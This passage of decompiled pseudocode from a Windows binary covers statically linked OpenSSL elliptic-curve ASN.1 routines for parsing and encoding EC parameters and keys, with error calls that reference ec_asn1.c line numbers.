    if ( !sub_437A10(*a2, Src, v6) || !sub_437A10(a2[1], v9, v10) )
    {
      sub_408310(16, 153, 13, (int)"crypto\\ec\\ec_asn1.c", 435);
      goto LABEL_38;
    }
    if ( *(_DWORD *)(a1 + 28) )
    {
      if ( !a2[2] )
      {
        v11 = sub_42C4E0();
        a2[2] = (int)v11;
        if ( !v11 )
        {
          v14 = 443;
          goto LABEL_37;
        }
      }
      *(_DWORD *)(a2[2] + 12) &= 0xFFFFFFF0;
      *(_DWORD *)(a2[2] + 12) |= 8u;
      if ( !sub_437A10(a2[2], *(void **)(a1 + 28), *(_DWORD *)(a1 + 32)) )
      {
        sub_408310(16, 153, 13, (int)"crypto\\ec\\ec_asn1.c", 450);
        goto LABEL_38;
      }
    }
    else
    {
      sub_42C4F0((void *)a2[2]);
      a2[2] = 0;
    }
    v20 = 1;
    goto LABEL_38;
  }
  return 0;
}

//----- (0041F000) --------------------------------------------------------
int __cdecl sub_41F000(_DWORD *a1, int a2)
{
  int v2; // esi
  int v3; // ecx
  _DWORD *v4; // edi
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  int v13; // [esp-4h] [ebp-18h]
  void *Block; // [esp+10h] [ebp-4h] BYREF

  Block = 0;
  if ( a2 )
  {
    v2 = a2;
  }
  else
  {
    v2 = sub_42FB20((int)&unk_4F35EC);
    if ( !v2 )
    {
      sub_408310(16, 261, 65, (int)"crypto\\ec\\ec_asn1.c", 480);
      goto LABEL_25;
    }
  }
  v3 = *(_DWORD *)(v2 + 4);
  *(_DWORD *)v2 = 1;
  if ( !sub_41EA80(v3, a1) )
  {
    sub_408310(16, 261, 16, (int)"crypto\\ec\\ec_asn1.c", 491);
    goto LABEL_24;
  }
  if ( !sub_41ED10((int)a1, *(int **)(v2 + 8)) )
  {
    sub_408310(16, 261, 16, (int)"crypto\\ec\\ec_asn1.c", 497);
    goto LABEL_24;
  }
  v4 = (_DWORD *)sub_422350((int)a1);
  if ( !v4 )
  {
    sub_408310(16, 261, 113, (int)"crypto\\ec\\ec_asn1.c", 503);
    goto LABEL_24;
  }
  v5 = sub_435DD0((int)a1);
  v6 = sub_437210((int)a1, v4, v5, &Block, 0);
  if ( !v6 )
  {
    sub_408310(16, 261, 16, (int)"crypto\\ec\\ec_asn1.c", 511);
    goto LABEL_24;
  }
  if ( !*(_DWORD *)(v2 + 12) )
  {
    v7 = sub_42C430();
    *(_DWORD *)(v2 + 12) = v7;
    if ( !v7 )
    {
      sub_413490(Block);
      sub_408310(16, 261, 65, (int)"crypto\\ec\\ec_asn1.c", 516);
      goto LABEL_24;
    }
  }
  sub_4329C0(*(_DWORD *)(v2 + 12), (int)Block, v6);
  v8 = (_DWORD *)sub_432B60((int)a1);
  if ( !v8 )
  {
    sub_408310(16, 261, 16, (int)"crypto\\ec\\ec_asn1.c", 524);
    goto LABEL_24;
  }
  v9 = sub_4318B0(v8, *(_DWORD **)(v2 + 16));
  *(_DWORD *)(v2 + 16) = v9;
  if ( !v9 )
  {
    v13 = 529;
LABEL_23:
    sub_408310(16, 261, 13, (int)"crypto\\ec\\ec_asn1.c", v13);
LABEL_24:
    if ( a2 )
      return 0;
LABEL_25:
    sub_42FEF0(v2, (int)&unk_4F35EC);
    return 0;
  }
  v10 = (_DWORD *)sub_407400((int)a1);
  if ( v10 )
  {
    v11 = sub_4318B0(v10, *(_DWORD **)(v2 + 20));
    *(_DWORD *)(v2 + 20) = v11;
    if ( !v11 )
    {
      v13 = 538;
      goto LABEL_23;
    }
  }
  return v2;
}

//----- (0041F1E0) --------------------------------------------------------
_DWORD *__cdecl sub_41F1E0(FILE *Stream, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v4; // eax
  int v5; // eax
  char **v6; // eax

  v2 = a2;
  if ( a2 )
  {
    if ( *a2 )
    {
      if ( *a2 == 1 )
      {
        v4 = a2[1];
        if ( v4 )
          sub_42FEF0(v4, (int)&unk_4F35EC);
      }
    }
    else
    {
      sub_422B70((void **)a2[1]);
    }
  }
  else
  {
    v2 = (_DWORD *)sub_42FB20((int)&unk_4F36BC);
    if ( !v2 )
    {
      sub_408310(16, 262, 65, (int)"crypto\\ec\\ec_asn1.c", 559);
      return 0;
    }
  }
  if ( sub_457690((int)Stream) )
  {
    v5 = _fileno(Stream);
    if ( !v5 )
    {
LABEL_14:
      sub_42FEF0((int)v2, (int)&unk_4F36BC);
      return 0;
    }
    *v2 = 0;
    v6 = sub_423310(v5);
  }
  else
  {
    *v2 = 1;
    v6 = (char **)sub_41F000(Stream, 0);
  }
  v2[1] = v6;
  if ( !v6 )
    goto LABEL_14;
  return v2;
}

//----- (0041F2B0) --------------------------------------------------------
int *__usercall sub_41F2B0@<eax>(__m64 a1@<mm0>, int a2)
{
  int *v2; // ebp
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // esi
  int v9; // eax
  int v10; // eax
  int v11; // esi
  int v12; // ebx
  int *v13; // ebx
  int v14; // esi
  int v15; // eax
  int v16; // ecx
  volatile LONG **v17; // eax
  int v18; // eax
  int v19; // eax
  _DWORD *v20; // esi
  void *v21; // eax
  int v22; // eax
  int v23; // eax
  _DWORD *v24; // esi
  int v25; // edi
  void **v27; // [esp+10h] [ebp-10h]
  void **v28; // [esp+14h] [ebp-Ch]
  void **v29; // [esp+18h] [ebp-8h]
  int **Block; // [esp+1Ch] [ebp-4h]
  int v31; // [esp+24h] [ebp+4h]

  v2 = 0;
  v4 = *(_DWORD **)(a2 + 4);
  v27 = 0;
  v29 = 0;
  v28 = 0;
  Block = 0;
  if ( !v4 || !*v4 || !v4[1] )
  {
    sub_408310(16, 263, 115, (int)"crypto\\ec\\ec_asn1.c", 606);
    goto LABEL_84;
  }
  v5 = *(_DWORD **)(a2 + 8);
  if ( !v5 || !*v5 || !*(_DWORD *)(*v5 + 8) || (v6 = v5[1]) == 0 || !*(_DWORD *)(v6 + 8) )
  {
    sub_408310(16, 263, 115, (int)"crypto\\ec\\ec_asn1.c", 614);
    goto LABEL_84;
  }
  v29 = (void **)sub_4174D0(*(_BYTE **)(**(_DWORD **)(a2 + 8) + 8), ***(_DWORD ***)(a2 + 8), 0);
  if ( !v29 )
  {
    sub_408310(16, 263, 3, (int)"crypto\\ec\\ec_asn1.c", 619);
    goto LABEL_84;
  }
  v28 = (void **)sub_4174D0(
                   *(_BYTE **)(*(_DWORD *)(*(_DWORD *)(a2 + 8) + 4) + 8),
                   **(_DWORD **)(*(_DWORD *)(a2 + 8) + 4),
                   0);
  if ( !v28 )
  {
    sub_408310(16, 263, 3, (int)"crypto\\ec\\ec_asn1.c", 624);
    goto LABEL_84;
  }
  v7 = sub_423680(**(_DWORD **)(a2 + 4));
  if ( v7 == 407 )
  {
    v8 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4);
    v31 = *(_DWORD *)v8;
    if ( *(int *)v8 > 661 )
    {
      sub_408310(16, 263, 143, (int)"crypto\\ec\\ec_asn1.c", 644);
      goto LABEL_84;
    }
    v27 = (void **)sub_4168C0();
    if ( !v27 )
    {
      sub_408310(16, 263, 65, (int)"crypto\\ec\\ec_asn1.c", 649);
      goto LABEL_84;
    }
    v9 = sub_423680(*(_DWORD *)(v8 + 4));
    if ( v9 == 682 )
    {
      if ( !*(_DWORD *)(v8 + 8) )
      {
        sub_408310(16, 263, 115, (int)"crypto\\ec\\ec_asn1.c", 660);
        goto LABEL_84;
      }
      v10 = sub_431860(*(unsigned int **)(v8 + 8));
      v11 = *(_DWORD *)v8;
      v12 = v10;
      if ( v11 <= v10 || v10 <= 0 )
      {
        sub_408310(16, 263, 137, (int)"crypto\\ec\\ec_asn1.c", 668);
        goto LABEL_84;
      }
      if ( !sub_417640(v27, v11) || !sub_417640(v27, v12) )
        goto LABEL_84;
    }
    else
    {
      if ( v9 != 683 )
      {
        if ( v9 == 681 )
          sub_408310(16, 263, 126, (int)"crypto\\ec\\ec_asn1.c", 708);
        else
          sub_408310(16, 263, 115, (int)"crypto\\ec\\ec_asn1.c", 712);
        goto LABEL_84;
      }
      v13 = *(int **)(v8 + 8);
      if ( !v13 )
      {
        sub_408310(16, 263, 115, (int)"crypto\\ec\\ec_asn1.c", 684);
        goto LABEL_84;
      }
      v14 = *(_DWORD *)v8;
      v15 = v13[2];
      if ( v14 <= v15 || (v16 = v13[1], v15 <= v16) || v16 <= *v13 || *v13 <= 0 )
      {
        sub_408310(16, 263, 132, (int)"crypto\\ec\\ec_asn1.c", 692);
        goto LABEL_84;
      }
      if ( !sub_417640(v27, v14) || !sub_417640(v27, *v13) || !sub_417640(v27, v13[1]) || !sub_417640(v27, v13[2]) )
        goto LABEL_84;
    }
    if ( !sub_417640(v27, 0) )
      goto LABEL_84;
    v17 = sub_437A70();
  }
  else
  {
    if ( v7 != 406 )
    {
      sub_408310(16, 263, 103, (int)"crypto\\ec\\ec_asn1.c", 747);
      goto LABEL_84;
    }
    v18 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4);
    if ( !v18 )
    {
      sub_408310(16, 263, 115, (int)"crypto\\ec\\ec_asn1.c", 724);
      goto LABEL_84;
    }
    v19 = sub_4318D0(v18, 0);
    v20 = (_DWORD *)v19;
    v27 = (void **)v19;
    if ( !v19 )
    {
      sub_408310(16, 263, 13, (int)"crypto\\ec\\ec_asn1.c", 729);
      goto LABEL_84;
    }
    if ( sub_416E40(v19) || sub_416DB0((int)v20) )
    {
      sub_408310(16, 263, 103, (int)"crypto\\ec\\ec_asn1.c", 734);
      goto LABEL_84;
    }
    v31 = sub_416F90(v20);
    if ( v31 > 661 )
    {
      sub_408310(16, 263, 143, (int)"crypto\\ec\\ec_asn1.c", 740);
      goto LABEL_84;
    }
    v17 = sub_437A20();
  }
  v2 = (int *)v17;
  if ( !v17 )
  {
    sub_408310(16, 263, 16, (int)"crypto\\ec\\ec_asn1.c", 752);
    goto LABEL_84;
  }
  if ( *(_DWORD *)(*(_DWORD *)(a2 + 8) + 8) )
  {
    sub_413490((void *)v17[7]);
    v21 = sub_4133F0(**(_DWORD **)(*(_DWORD *)(a2 + 8) + 8));
    v2[7] = (int)v21;
    if ( !v21 )
    {
      sub_408310(16, 263, 65, (int)"crypto\\ec\\ec_asn1.c", 760);
      goto LABEL_84;
    }
    memcpy(v21, *(const void **)(*(_DWORD *)(*(_DWORD *)(a2 + 8) + 8) + 8), **(_DWORD **)(*(_DWORD *)(a2 + 8) + 8));
    v2[8] = **(_DWORD **)(*(_DWORD *)(a2 + 8) + 8);
  }
  if ( !*(_DWORD *)(a2 + 16) || (v22 = *(_DWORD *)(a2 + 12)) == 0 || !*(_DWORD *)(v22 + 8) )
  {
    sub_408310(16, 263, 115, (int)"crypto\\ec\\ec_asn1.c", 769);
    goto LABEL_84;
  }
  Block = (int **)sub_435F90(v2);
  if ( !Block )
  {
LABEL_84:
    sub_436840((volatile LONG **)v2);
    v2 = 0;
    goto LABEL_85;
  }
  std::swfun((struct std::ios_base *)v2, **(_BYTE **)(*(_DWORD *)(a2 + 12) + 8) & 0xFE);
  if ( !sub_437160(a1, (int **)v2, Block, *(_BYTE **)(*(_DWORD *)(a2 + 12) + 8), **(_DWORD **)(a2 + 12), 0) )
  {
    sub_408310(16, 263, 16, (int)"crypto\\ec\\ec_asn1.c", 783);
    goto LABEL_84;
  }
  v23 = sub_4318D0(*(_DWORD *)(a2 + 16), (int)v29);
  v24 = (_DWORD *)v23;
  v29 = (void **)v23;
  if ( !v23 )
  {
    sub_408310(16, 263, 13, (int)"crypto\\ec\\ec_asn1.c", 789);
    goto LABEL_84;
  }
  if ( sub_416E40(v23) || sub_416DB0((int)v24) )
  {
    sub_408310(16, 263, 122, (int)"crypto\\ec\\ec_asn1.c", 793);
    goto LABEL_84;
  }
  if ( sub_416F90(v24) > v31 + 1 )
  {
    sub_408310(16, 263, 122, (int)"crypto\\ec\\ec_asn1.c", 797);
    goto LABEL_84;
  }
  v25 = *(_DWORD *)(a2 + 20);
  if ( v25 )
  {
    v28 = (void **)sub_4318D0(v25, (int)v28);
    if ( !v28 )
    {
      sub_408310(16, 263, 13, (int)"crypto\\ec\\ec_asn1.c", 806);
      goto LABEL_84;
    }
  }
  else
  {
    sub_417060(v28);
    v28 = 0;
  }
  if ( !sub_436B20((int)v2, Block, v24, v28) )
  {
    sub_408310(16, 263, 16, (int)"crypto\\ec\\ec_asn1.c", 811);
    goto LABEL_84;
  }
LABEL_85:
  sub_417060(v27);
  sub_417060(v29);
  sub_417060(v28);
  sub_436040(Block);
  return v2;
}

//----- (0041F880) --------------------------------------------------------
int *__usercall sub_41F880@<eax>(__m64 a1@<mm0>, int *a2)
{
  int v3; // ecx
  int v4; // eax
  int *v5; // eax
  int *v6; // esi
  int *v7; // eax
  int *v8; // esi

  if ( a2 )
  {
    v3 = *a2;
    if ( *a2 )
    {
      if ( v3 == 1 )
      {
        v7 = sub_41F2B0(a1, a2[1]);
        v8 = v7;
        if ( v7 )
        {
          std::spfun((struct std::ios_base *)v7, 0);
          return v8;
        }
        else
        {
          sub_408310(16, 264, 16, (int)"crypto\\ec\\ec_asn1.c", 852);
          return 0;
        }
      }
      else
      {
        if ( v3 != 2 )
          sub_408310(16, 264, 115, (int)"crypto\\ec\\ec_asn1.c", 859);
        return 0;
      }
    }
    else
    {
      v4 = sub_423680(a2[1]);
      v5 = sub_4375B0(v4);
      v6 = v5;
      if ( v5 )
      {
        std::spfun((struct std::ios_base *)v5, 1);
        return v6;
      }
      else
      {
        sub_408310(16, 264, 119, (int)"crypto\\ec\\ec_asn1.c", 844);
        return 0;
      }
    }
  }
  else
  {
    sub_408310(16, 264, 124, (int)"crypto\\ec\\ec_asn1.c", 836);
    return 0;
  }
}

//----- (0041F960) --------------------------------------------------------
int *__usercall sub_41F960@<eax>(__m64 a1@<mm0>, volatile LONG ***a2, _DWORD *a3, int a4)
{
  _DWORD *v4; // ebp
  int *v5; // eax
  int v6; // esi
  int *result; // eax
  int *v8; // edi

  v4 = a3;
  a3 = (_DWORD *)*a3;
  v5 = (int *)sub_42E9C0(0, (void **)&a3, a4, (int)&unk_4F36BC);
  v6 = (int)v5;
  if ( v5 )
  {
    v8 = sub_41F880(a1, v5);
    if ( v8 )
    {
      if ( a2 )
      {
        sub_436840(*a2);
        *a2 = (volatile LONG **)v8;
      }
      sub_42FEF0(v6, (int)&unk_4F36BC);
      result = v8;
      *v4 = a3;
    }
    else
    {
      sub_408310(16, 145, 127, (int)"crypto\\ec\\ec_asn1.c", 881);
      sub_42FEF0(v6, (int)&unk_4F36BC);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 145, 117, (int)"crypto\\ec\\ec_asn1.c", 875);
    sub_42FEF0(0, (int)&unk_4F36BC);
    return 0;
  }
  return result;
}

//----- (0041FAC0) --------------------------------------------------------
int __usercall sub_41FAC0@<eax>(__m64 a1@<mm0>, int *a2, void **a3, int a4)
{
  int v4; // edi
  int v6; // esi
  int v7; // ebx
  _DWORD *v8; // eax
  _BYTE *v9; // ebx
  int v10; // eax
  int (__cdecl *v11)(int); // eax
  void *v12; // [esp+4h] [ebp-4h] BYREF

  v12 = *a3;
  v4 = sub_42E9C0(0, &v12, a4, (int)&unk_4F3728);
  if ( !v4 )
  {
    sub_408310(16, 146, 16, (int)"crypto\\ec\\ec_asn1.c", 922);
    return 0;
  }
  if ( !a2 || (v6 = *a2) == 0 )
  {
    v6 = sub_41DE60();
    if ( !v6 )
    {
      sub_408310(16, 146, 65, (int)"crypto\\ec\\ec_asn1.c", 928);
      goto LABEL_25;
    }
  }
  if ( *(_DWORD *)(v4 + 8) )
  {
    sub_436840(*(volatile LONG ***)(v6 + 12));
    *(_DWORD *)(v6 + 12) = sub_41F880(a1, *(int **)(v4 + 8));
  }
  if ( !*(_DWORD *)(v6 + 12) )
  {
    sub_408310(16, 146, 16, (int)"crypto\\ec\\ec_asn1.c", 940);
    goto LABEL_25;
  }
  *(_DWORD *)(v6 + 8) = *(_DWORD *)v4;
  v7 = *(_DWORD *)(v4 + 4);
  if ( !v7 )
  {
    sub_408310(16, 146, 125, (int)"crypto\\ec\\ec_asn1.c", 952);
LABEL_25:
    if ( !a2 || *a2 != v6 )
      sub_41DE70((volatile LONG *)v6);
    sub_42FEF0(v4, (int)&unk_4F3728);
    return 0;
  }
  sub_435D30(*(_DWORD *)(v4 + 4));
  sub_432B60(v7);
  if ( !sub_41E700(v6) )
    goto LABEL_25;
  sub_436070(*(_BYTE **)(v6 + 16));
  v8 = sub_435F90(*(int **)(v6 + 12));
  *(_DWORD *)(v6 + 16) = v8;
  if ( !v8 )
  {
    sub_408310(16, 146, 16, (int)"crypto\\ec\\ec_asn1.c", 959);
    goto LABEL_25;
  }
  if ( *(_DWORD *)(v4 + 12) )
  {
    v9 = (_BYTE *)sub_432B60(*(_DWORD *)(v4 + 12));
    v10 = sub_435D30(*(_DWORD *)(v4 + 12));
    if ( !sub_41E5E0(a1, v6, v9, v10, 0) )
    {
      sub_408310(16, 146, 16, (int)"crypto\\ec\\ec_asn1.c", 970);
      goto LABEL_25;
    }
  }
  else
  {
    v11 = *(int (__cdecl **)(int))(**(_DWORD **)(v6 + 12) + 180);
    if ( !v11 || !v11(v6) )
      goto LABEL_25;
    *(_DWORD *)(v6 + 24) |= 2u;
  }
  if ( a2 )
    *a2 = v6;
  sub_41EA60(v4);
  *a3 = v12;
  return v6;
}

//----- (0041FCA0) --------------------------------------------------------
int __cdecl sub_41FCA0(int a1, void **a2)
{
  int v2; // ebx
  int v3; // esi
  bool v4; // zf
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  void *v9; // [esp+10h] [ebp-10h] BYREF
  void *Block; // [esp+14h] [ebp-Ch] BYREF
  int v11; // [esp+18h] [ebp-8h]
  int v12; // [esp+1Ch] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v12 = 0;
  v11 = 0;
  v9 = 0;
  Block = 0;
  if ( !a1 || !*(_DWORD *)(a1 + 12) || (*(_BYTE *)(a1 + 24) & 2) == 0 && !*(_DWORD *)(a1 + 16) )
  {
    sub_408310(16, 192, 67, (int)"crypto\\ec\\ec_asn1.c", 1004);
    goto LABEL_22;
  }
  v3 = sub_42FB20((int)&unk_4F3728);
  if ( v3 )
  {
    *(_DWORD *)v3 = *(_DWORD *)(a1 + 8);
    v2 = sub_41E7C0(a1, &v9);
    if ( v2 )
    {
      sub_4329C0(*(_DWORD *)(v3 + 4), (int)v9, v2);
      v4 = (*(_BYTE *)(a1 + 24) & 1) == 0;
      v9 = 0;
      if ( !v4 || (v5 = sub_41F1E0(*(FILE **)(a1 + 12), *(_DWORD **)(v3 + 8)), (*(_DWORD *)(v3 + 8) = v5) != 0) )
      {
        if ( (*(_BYTE *)(a1 + 24) & 2) == 0 )
        {
          v6 = sub_42C4E0();
          *(_DWORD *)(v3 + 12) = v6;
          if ( !v6 )
          {
            sub_408310(16, 192, 65, (int)"crypto\\ec\\ec_asn1.c", 1037);
            goto LABEL_22;
          }
          v7 = sub_41E5A0(a1, *(_DWORD *)(a1 + 28), &Block, 0);
          if ( !v7 )
          {
            sub_408310(16, 192, 16, (int)"crypto\\ec\\ec_asn1.c", 1044);
            goto LABEL_22;
          }
          *(_DWORD *)(*(_DWORD *)(v3 + 12) + 12) &= 0xFFFFFFF0;
          *(_DWORD *)(*(_DWORD *)(v3 + 12) + 12) |= 8u;
          sub_4329C0(*(_DWORD *)(v3 + 12), (int)Block, v7);
          Block = 0;
        }
        v12 = sub_41EA40(v3, a2);
        if ( v12 )
          v11 = 1;
        else
          sub_408310(16, 192, 16, (int)"crypto\\ec\\ec_asn1.c", 1055);
      }
      else
      {
        sub_408310(16, 192, 16, (int)"crypto\\ec\\ec_asn1.c", 1029);
      }
    }
    else
    {
      sub_408310(16, 192, 16, (int)"crypto\\ec\\ec_asn1.c", 1018);
    }
  }
  else
  {
    sub_408310(16, 192, 65, (int)"crypto\\ec\\ec_asn1.c", 1009);
  }
LABEL_22:
  sub_4134B0(v9, v2);
  sub_413490(Block);
  sub_42FEF0(v3, (int)&unk_4F3728);
  return v11 != 0 ? v12 : 0;
}

//----- (0041FE80) --------------------------------------------------------
int __cdecl sub_41FE80(FILE *Stream, void **a2)
{
  _DWORD *v2; // eax
  int v3; // esi
  signed int v4; // edi

  if ( Stream )
  {
    v2 = sub_41F1E0((FILE *)Stream->_flag, 0);
    v3 = (int)v2;
    if ( v2 )
    {
      v4 = sub_42F620((int)v2, a2, (int)&unk_4F36BC);
      if ( v4 )
      {
        sub_42FEF0(v3, (int)&unk_4F36BC);
        return v4;
      }
      else
      {
        sub_408310(16, 191, 121, (int)"crypto\\ec\\ec_asn1.c", 905);
        sub_42FEF0(v3, (int)&unk_4F36BC);
        return 0;
      }
    }
    else
    {
      sub_408310(16, 191, 120, (int)"crypto\\ec\\ec_asn1.c", 901);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 190, 67, (int)"crypto\\ec\\ec_asn1.c", 1069);
    return 0;
  }
}

//----- (0041FEC0) --------------------------------------------------------
int __usercall sub_41FEC0@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3, int a4)
{
  int v4; // esi

  if ( a3 && *a3 )
  {
    if ( !a2 || (v4 = *a2) == 0 )
    {
      v4 = sub_41DE60();
      if ( !v4 )
      {
        sub_408310(16, 144, 65, (int)"crypto\\ec\\ec_asn1.c", 1086);
        return 0;
      }
    }
    if ( sub_41F960(a1, (volatile LONG ***)(v4 + 12), a3, a4) )
    {
      if ( a2 )
        *a2 = v4;
      return v4;
    }
    else
    {
      sub_408310(16, 144, 16, (int)"crypto\\ec\\ec_asn1.c", 1093);
      if ( a2 && *a2 == v4 )
        return 0;
      sub_41DE70((volatile LONG *)v4);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 144, 67, (int)"crypto\\ec\\ec_asn1.c", 1080);
    return 0;
  }
}

//----- (0041FF90) --------------------------------------------------------
int __usercall sub_41FF90@<eax>(__m64 a1@<mm0>, int *a2, _BYTE **a3, int a4)
{
  int v4; // esi

  if ( a2 && (v4 = *a2) != 0 && *(_DWORD *)(v4 + 12) )
  {
    if ( sub_41E5E0(a1, v4, *a3, a4, 0) )
    {
      *a3 += a4;
      return v4;
    }
    else
    {
      sub_408310(16, 152, 16, (int)"crypto\\ec\\ec_asn1.c", 1118);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 152, 67, (int)"crypto\\ec\\ec_asn1.c", 1113);
    return 0;
  }
}

//----- (00420010) --------------------------------------------------------
int __cdecl sub_420010(int a1, void **a2)
{
  int v2; // ebp
  int result; // eax
  unsigned int v4; // ebx
  void *v5; // eax

  v2 = 0;
  if ( !a1 )
  {
    sub_408310(16, 151, 67, (int)"crypto\\ec\\ec_asn1.c", 1131);
    return 0;
  }
  result = sub_4370B0(*(_DWORD *)(a1 + 12), *(_DWORD **)(a1 + 16), *(_DWORD *)(a1 + 28), 0, 0, 0);
  v4 = result;
  if ( a2 && result )
  {
    if ( !*a2 )
    {
      v5 = sub_4133F0(result);
      *a2 = v5;
      if ( !v5 )
      {
        sub_408310(16, 151, 65, (int)"crypto\\ec\\ec_asn1.c", 1144);
        return 0;
      }
      v2 = 1;
    }
    if ( sub_4370B0(*(_DWORD *)(a1 + 12), *(_DWORD **)(a1 + 16), *(_DWORD *)(a1 + 28), *a2, v4, 0) )
    {
      if ( !v2 )
        *a2 = (char *)*a2 + v4;
      return v4;
    }
    else
    {
      sub_408310(16, 151, 16, (int)"crypto\\ec\\ec_asn1.c", 1151);
      if ( v2 )
      {
        sub_413490(*a2);
        *a2 = 0;
      }
      return 0;
    }
  }
  return result;
}

//----- (00420120) --------------------------------------------------------
int __cdecl sub_420120(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_4F376C);
}

//----- (00420140) --------------------------------------------------------
signed int __cdecl sub_420140(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_4F376C);
}

//----- (00420160) --------------------------------------------------------
void *sub_420160()
{
  void *result; // eax

  result = sub_413430(8u);
  if ( !result )
  {
    sub_408310(16, 265, 65, (int)"crypto\\ec\\ec_asn1.c", 1176);
    return 0;
  }
  return result;
}

//----- (004201A0) --------------------------------------------------------
void __cdecl sub_4201A0(_DWORD **Block)
{
  if ( Block )
  {
    sub_417000(*Block);
    sub_417000(Block[1]);
    sub_413490(Block);
  }
}

//----- (004201D0) --------------------------------------------------------
int __cdecl sub_4201D0(int a1)
{
  int v2; // eax
  int v3; // eax
  signed int v4; // eax
  int v5[4]; // [esp+0h] [ebp-10h] BYREF

  if ( !a1 )
    return 0;
  v2 = sub_407400(a1);
  if ( !v2 )
    return 0;
  v3 = sub_435D40(v2);
  if ( !v3 )
    return 0;
  v5[0] = (v3 + 7) / 8;
  v5[2] = (int)&a1;
  v5[1] = 2;
  LOBYTE(a1) = -1;
  v4 = sub_42C470((int)v5, 0);
  return sub_4328B0(1, 2 * v4, 16);
}

//----- (00420250) --------------------------------------------------------
int __cdecl sub_420250(int a1, volatile LONG **a2)
{
  int v2; // eax

  if ( a1 )
  {
    if ( a1 == 2 )
    {
      sub_4346C0(*a2);
      *a2 = 0;
      return 2;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    v2 = sub_4349A0();
    *a2 = (volatile LONG *)v2;
    return v2 != 0 ? 2 : 0;
  }
}

//----- (004202A0) --------------------------------------------------------
int __cdecl sub_4202A0(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_4F3834);
}

//----- (004202C0) --------------------------------------------------------
signed int __cdecl sub_4202C0(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_4F3834);
}

//----- (004202E0) --------------------------------------------------------
void *sub_4202E0()
{
  return &unk_4F3878;
}

//----- (004202F0) --------------------------------------------------------
int __cdecl sub_4202F0(volatile LONG **a1, void **a2, int a3)
{
  int result; // eax
  int v4; // edi
  int v5; // esi
  int v6; // eax

  result = sub_4349A0();
  v4 = result;
  if ( result )
  {
    v5 = sub_42E9C0(0, a2, a3, (int)&unk_4F3894);
    if ( v5 )
    {
      if ( a1 )
      {
        sub_4346C0(*a1);
        *a1 = (volatile LONG *)v4;
      }
      *(_DWORD *)(v4 + 8) = *(_DWORD *)v5;
      *(_DWORD *)(v4 + 36) = *(_DWORD *)(v5 + 4);
      *(_DWORD *)(v4 + 12) = *(_DWORD *)(v5 + 8);
      *(_DWORD *)(v4 + 40) = *(_DWORD *)(v5 + 12);
      v6 = *(_DWORD *)(v5 + 16);
      if ( v6 )
      {
        *(_DWORD *)(v4 + 44) = *(_DWORD *)(*(_DWORD *)v6 + 8);
        *(_DWORD *)(v4 + 48) = ***(_DWORD ***)(v5 + 16);
        *(_DWORD *)(v4 + 52) = *(_DWORD *)(*(_DWORD *)(v5 + 16) + 4);
        *(_DWORD *)(**(_DWORD **)(v5 + 16) + 8) = 0;
        sub_42C4F0(**(void ***)(v5 + 16));
        sub_413490(*(void **)(v5 + 16));
        *(_DWORD *)(v5 + 16) = 0;
      }
      sub_413490((void *)v5);
      return v4;
    }
    else
    {
      sub_4346C0((volatile LONG *)v4);
      return 0;
    }
  }
  return result;
}

//----- (004203D0) --------------------------------------------------------
signed int __cdecl sub_4203D0(_DWORD *a1, void **a2)
{
  int v2; // ecx
  int v3; // edx
  int v4; // eax
  int v6[2]; // [esp+0h] [ebp-2Ch] BYREF
  int v7[4]; // [esp+8h] [ebp-24h] BYREF
  int v8[4]; // [esp+18h] [ebp-14h] BYREF
  int *v9; // [esp+28h] [ebp-4h]

  v2 = a1[2];
  v8[2] = a1[3];
  v8[3] = a1[10];
  v3 = a1[13];
  v8[0] = v2;
  v8[1] = a1[9];
  if ( v3 && a1[11] && (v4 = a1[12], v4 > 0) )
  {
    v7[2] = a1[11];
    v7[0] = v4;
    v7[3] = 8;
    v6[0] = (int)v7;
    v6[1] = v3;
    v9 = v6;
  }
  else
  {
    v9 = 0;
  }
  return sub_42F620((int)v8, a2, (int)&unk_4F3894);
}

//----- (00420460) --------------------------------------------------------
int __usercall sub_420460@<eax>(int a1@<esi>, int a2)
{
  int v2; // eax
  unsigned int v3; // ebx
  int result; // eax
  void *v5; // edi
  int v6; // eax

  v2 = *(_DWORD *)(a1 + 8);
  if ( *(_DWORD *)(a1 + 4) != v2 )
  {
LABEL_9:
    *(_DWORD *)(*(_DWORD *)a1 + 4 * *(_DWORD *)(a1 + 4)) = a2;
    result = 1;
    ++*(_DWORD *)(a1 + 4);
    return result;
  }
  if ( v2 )
    v3 = (unsigned int)(3 * v2) >> 1;
  else
    v3 = 32;
  result = (int)sub_4133F0(4 * v3);
  v5 = (void *)result;
  if ( result )
  {
    v6 = *(_DWORD *)(a1 + 4);
    if ( v6 )
      memcpy(v5, *(const void **)a1, 4 * v6);
    sub_413490(*(void **)a1);
    *(_DWORD *)a1 = v5;
    *(_DWORD *)(a1 + 8) = v3;
    goto LABEL_9;
  }
  return result;
}

//----- (004204F0) --------------------------------------------------------
int __usercall sub_4204F0@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // edi
  int v2; // ebx
  int result; // eax
  int v4; // edx
  _DWORD *v5; // [esp-14h] [ebp-14h]

  if ( *a1 )
  {
    do
    {
      v1 = (_DWORD *)*a1;
      v2 = 16;
      do
      {
        if ( *v1 )
          sub_417000(v1);
        v1 += 5;
        --v2;
      }
      while ( v2 );
      v5 = (_DWORD *)*a1;
      a1[1] = *(_DWORD *)(*a1 + 324);
      sub_413490(v5);
      v4 = a1[1];
      *a1 = v4;
    }
    while ( v4 );
  }
  return result;
}

//----- (00420550) --------------------------------------------------------
